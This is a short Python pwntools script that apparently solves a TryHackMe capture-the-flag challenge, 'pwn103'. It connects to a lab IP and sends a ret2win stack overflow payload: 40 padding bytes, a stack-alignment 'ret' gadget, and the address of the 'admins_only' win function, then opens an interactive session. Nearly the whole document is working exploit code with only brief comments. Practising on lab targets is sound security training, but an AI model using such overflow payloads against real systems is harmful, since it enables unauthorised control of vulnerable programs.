# a basic ret2win - need to overflow ret address with
# the address of the win function, 'admins_only'

from pwn import *

current_thmip = '10.10.134.184'

p = remote(current_thmip, 9003)
# p = process('./pwn103.pwn103')

payload = b'A'*40
payload += p64(0x401016) # address of a 'ret' instruction - needed for stack alignment
payload += p64(0x401554) # fixed location of admins_only win function

p.clean()
p.sendline('3') # navigating menu
p.clean()
p.sendline(payload)
print(p.clean())
p.interactive()
